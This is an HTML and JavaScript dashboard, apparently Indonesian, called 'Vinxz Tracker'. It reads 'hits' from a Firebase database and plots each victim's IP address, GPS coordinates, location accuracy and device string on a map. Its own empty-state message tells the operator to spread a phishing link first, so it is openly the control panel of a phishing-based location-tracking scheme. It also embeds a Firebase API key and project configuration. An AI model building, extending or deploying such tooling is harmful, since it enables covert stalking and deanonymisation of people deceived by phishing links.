<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vinxz Tracker — Panel</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui;background:#05050a;color:#e8e8e8;min-height:100dvh;display:flex;flex-direction:column}
header{padding:14px 20px;background:rgba(14,14,17,.95);backdrop-filter:blur(12px);border-bottom:1px solid rgba(255,255,255,.08);display:flex;align-items:center;gap:12px;z-index:1000}
header .dot{width:10px;height:10px;background:#0f0;border-radius:50%;box-shadow:0 0 10px #0f0;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
header h1{font-size:16px;font-weight:700}
header .stats{margin-left:auto;font-size:12px;color:#888;display:flex;gap:16px}
header .stats b{color:#1e4dff;font-family:monospace}
.layout{flex:1;display:flex;position:relative}
#map{flex:1;height:calc(100dvh - 60px);background:#0a0a0c}
.sidebar{position:absolute;top:12px;right:12px;width:340px;max-width:calc(100% - 24px);max-height:calc(100% - 24px);background:rgba(14,14,17,.95);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.08);border-radius:14px;overflow:hidden;display:flex;flex-direction:column;z-index:500;transition:transform .3s}
.sidebar.collapsed{transform:translateX(calc(100% + 20px))}
.sidebar-header{padding:14px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;justify-content:space-between;align-items:center}
.sidebar-header h2{font-size:14px}
.sidebar-header button{background:transparent;border:none;color:#888;font-size:18px;cursor:pointer;padding:0 6px}
.toggle-btn{position:absolute;top:12px;right:12px;z-index:600;background:linear-gradient(135deg,#1e4dff,#5b2bff);color:#fff;border:none;padding:10px 16px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;box-shadow:0 4px 20px rgba(30,77,255,.5)}
.toggle-btn.hidden{display:none}
.hits-list{overflow-y:auto;flex:1;padding:8px}
.hit{padding:12px;border-radius:10px;margin-bottom:6px;background:rgba(23,23,28,.6);border:1px solid rgba(255,255,255,.05);cursor:pointer;transition:all .2s}
.hit:hover{background:rgba(30,77,255,.15);border-color:#1e4dff}
.hit .time{font-size:11px;color:#666;font-family:monospace;margin-bottom:4px}
.hit .title{font-weight:600;font-size:13px;margin-bottom:4px}
.hit .meta{font-size:11px;color:#888;line-height:1.5}
.empty{text-align:center;padding:40px 20px;color:#666;font-size:13px}
.filters{display:flex;gap:6px;padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.08);overflow-x:auto}
.filters button{padding:6px 12px;background:rgba(23,23,28,.6);border:1px solid rgba(255,255,255,.08);color:#aaa;border-radius:8px;font-size:11px;cursor:pointer;white-space:nowrap}
.filters button.on{background:#1e4dff;color:#fff;border-color:#1e4dff}
.leaflet-container{background:#0a0a0c}
@media(max-width:640px){
  .sidebar{width:calc(100% - 24px);max-height:50vh;bottom:12px;top:auto}
  .sidebar.collapsed{transform:translateY(calc(100% + 20px))}
  header h1{font-size:14px}
  header .stats{font-size:11px;gap:10px}
}
</style>
</head>
<body>

<header>
  <div class="dot"></div>
  <h1>VINZX TRACKER 🎯</h1>
  <div class="stats">
    <span>Total: <b id="total">0</b></span>
    <span>Hari ini: <b id="today">0</b></span>
  </div>
</header>

<button class="toggle-btn" id="toggleBtn" onclick="toggleSidebar()">📋 List</button>

<div class="layout">
  <div id="map"></div>
  <div class="sidebar collapsed" id="sidebar">
    <div class="sidebar-header">
      <h2>🎯 Hits</h2>
      <button onclick="toggleSidebar()">✕</button>
    </div>
    <div class="filters">
      <button class="on" data-f="all" onclick="setFilter('all')">Semua</button>
      <button data-f="today" onclick="setFilter('today')">Hari ini</button>
      <button data-f="7d" onclick="setFilter('7d')">7 Hari</button>
      <button data-f="30d" onclick="setFilter('30d')">30 Hari</button>
    </div>
    <div class="hits-list" id="hitsList">
      <div class="empty">Menunggu hit...</div>
    </div>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAix0w6jXzMWWlTy2qVd94FwCkHFqZFp_k",
  authDomain: "vinzx-tracker.firebaseapp.com",
  databaseURL: "https://vinzx-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "vinzx-tracker",
  storageBucket: "vinzx-tracker.firebasestorage.app",
  messagingSenderId: "954145933533",
  appId: "1:954145933533:web:ef331709e50f2e9f22f334"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const map = L.map('map').setView([-2.5, 118], 5);
L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: '&copy; OpenStreetMap',
  maxZoom: 19
}).addTo(map);

const pinIcon = L.divIcon({
  className: 'custom-pin',
  html: '<div style="width:20px;height:20px;background:radial-gradient(circle,#1e4dff,#5b2bff);border-radius:50%;box-shadow:0 0 15px #1e4dff,0 0 0 4px rgba(30,77,255,.3);border:2px solid #fff"></div>',
  iconSize: [20, 20],
  iconAnchor: [10, 10]
});

let allHits = [];
let markers = {};
let currentFilter = 'all';

function timeAgo(ts){
  if(!ts) return '-';
  const diff = Date.now() - ts;
  const m = Math.floor(diff / 60000);
  if(m < 1) return 'baru aja';
  if(m < 60) return m + ' menit lalu';
  const h = Math.floor(m / 60);
  if(h < 24) return h + ' jam lalu';
  const dd = Math.floor(h / 24);
  if(dd < 30) return dd + ' hari lalu';
  return new Date(ts).toLocaleDateString('id-ID');
}

function setFilter(f){
  currentFilter = f;
  document.querySelectorAll('.filters button').forEach(b => b.classList.toggle('on', b.dataset.f === f));
  renderList();
  renderPins();
}

function filterHits(hits){
  const now = Date.now();
  return hits.filter(h => {
    if(currentFilter === 'all') return true;
    const ts = h.ts || 0;
    if(currentFilter === 'today') return new Date(ts).toDateString() === new Date().toDateString();
    if(currentFilter === '7d') return now - ts < 7 * 86400000;
    if(currentFilter === '30d') return now - ts < 30 * 86400000;
    return true;
  });
}

function renderPins(){
  Object.values(markers).forEach(m => map.removeLayer(m));
  markers = {};
  filterHits(allHits).forEach(h => {
    if(!h.lat || !h.lon) return;
    const m = L.marker([h.lat, h.lon], { icon: pinIcon }).addTo(map);
    m.bindPopup(`
      <div style="font-family:system-ui;min-width:180px">
        <div style="font-weight:700;margin-bottom:6px;color:#1e4dff">🎯 HIT</div>
        <div style="font-size:12px;line-height:1.6">
          <b>IP:</b> ${h.ip || '-'}<br>
          <b>Waktu:</b> ${timeAgo(h.ts)}<br>
          <b>Akurasi:</b> ${h.acc ? Math.round(h.acc) + 'm' : '-'}<br>
          <b>Device:</b> ${(h.ua || '').slice(0, 40)}...
        </div>
      </div>
    `);
    markers[h.key] = m;
  });
}

function renderList(){
  const list = document.getElementById('hitsList');
  const filtered = filterHits(allHits);
  if(!filtered.length){
    list.innerHTML = '<div class="empty">Belum ada hit.<br>Sebar link phishing lo dulu.</div>';
    return;
  }
  list.innerHTML = filtered.map(h => `
    <div class="hit" onclick="focusHit('${h.key}')">
      <div class="time">${timeAgo(h.ts)}</div>
      <div class="title">${h.ip || 'Unknown'}</div>
      <div class="meta">📍 ${h.lat ? h.lat.toFixed(4) + ', ' + h.lon.toFixed(4) : 'no GPS'}<br>🎯 ${h.acc ? Math.round(h.acc) + 'm' : '-'}</div>
    </div>
  `).join('');
}

window.focusHit = function(key){
  const m = markers[key];
  if(m){ map.setView(m.getLatLng(), 15); m.openPopup(); }
};

window.toggleSidebar = function(){
  const s = document.getElementById('sidebar');
  const b = document.getElementById('toggleBtn');
  s.classList.toggle('collapsed');
  b.classList.toggle('hidden', !s.classList.contains('collapsed'));
};

window.setFilter = setFilter;

onValue(ref(db, 'hits'), (snapshot) => {
  const data = snapshot.val() || {};
  allHits = Object.entries(data).map(([k, v]) => ({ key: k, ...v }));
  allHits.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  document.getElementById('total').textContent = allHits.length;
  document.getElementById('today').textContent = allHits.filter(h => h.ts && new Date(h.ts).toDateString() === new Date().toDateString()).length;
  renderPins();
  renderList();
  if(Object.keys(markers).length > 0){
    const group = L.featureGroup(Object.values(markers));
    map.fitBounds(group.getBounds().pad(0.2));
  }
});
</script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</body>
</html>
